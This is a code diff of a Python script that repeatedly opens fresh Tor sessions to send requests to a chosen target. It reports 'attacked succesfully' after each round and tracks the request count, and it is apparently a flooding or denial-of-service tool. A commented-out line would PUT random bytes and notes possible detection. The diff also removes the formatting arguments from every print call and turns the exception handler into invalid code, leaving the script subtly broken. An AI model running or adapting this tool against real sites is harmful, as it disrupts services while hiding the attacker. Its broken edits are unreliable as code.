@@ -16,7 +16,7 @@ def main():
         while counter < max_attempts:
             tor = Tor()
             if not tor.tor_installed():
-                print(u'{}[!]{} Tor is not installed. Exiting...').format(color.RED, color.END)
+                print(u'{}[!]{} Tor is not installed. Exiting...')
                 sys.exit(1)
             else:
                 # Initial timestamp and increment the counter
@@ -25,31 +25,31 @@ def main():
 
                 # Init a new Tor session
                 session = tor.new_session()
-                print(u'{}[!]{} New Tor session initialized...').format(color.BLUE, color.END)
-                print(u'\n{}[+]{} Target: {}{}{}').format(color.PURPLE, color.END, color.PURPLE, target, color.END)
+                print(u'{}[!]{} New Tor session initialized...')
+                print(u'\n{}[+]{} Target: {}{}{}')
 
                 # Getting data from the server
-                print(u'{}[*]{} Getting data from {}...').format(color.ORANGE, color.END, target)
+                print(u'{}[*]{} Getting data from {}...')
                 session.get(target)
                 # Putting data (omitted, maybe it makes detection easier)
                 # random_bytes = random._urandom(1490)
                 # print u'{}[*]{} Putting data on {}...'.format(color.ORANGE, color.END, target)
                 # session.put(target, random_bytes)
-                print(u'{}[*]{} Target {} was attacked succesfully').format(color.ORANGE, color.END, target)
+                print(u'{}[*]{} Target {} was attacked succesfully')
 
     except KeyboardInterrupt: pass
-    except Exception(exception):
-        print(u'\n{}[!]{} An error has occurred:').format(color.RED, color.END)
-        print(u'{}{}{}').format(color.RED, exception, Exception, color.END)
+    except Exception(Exception):
+        print(u'\n{}[!]{} An error has occurred:')
+        print(u'{}{}{}')
 
     finally:
         end_time = datetime.datetime.now().time().strftime('%H:%M:%S')
         total_time = (datetime.datetime.strptime(end_time, '%H:%M:%S') - datetime.datetime.strptime(start_time, '%H:%M:%S'))
-        print(u'{}[+]{} Time elapsed:\t{}').format(color.GREEN, color.END, total_time)
-        print(u'{}[+]{} Number of requests:\t{}').format(color.GREEN, color.END, counter)
-        print(u'{}[!]{} Stopping Tor...').format(color.RED, color.END)
+        print(u'{}[+]{} Time elapsed:\t{}')
+        print(u'{}[+]{} Number of requests:\t{}')
+        print(u'{}[!]{} Stopping Tor...')
         tor.stop_tor()
-        print(u'{}[!]{} Exiting...\n').format(color.RED, color.END)
+        print(u'{}[!]{} Exiting...\n')
         sys.exit(0)
 
 
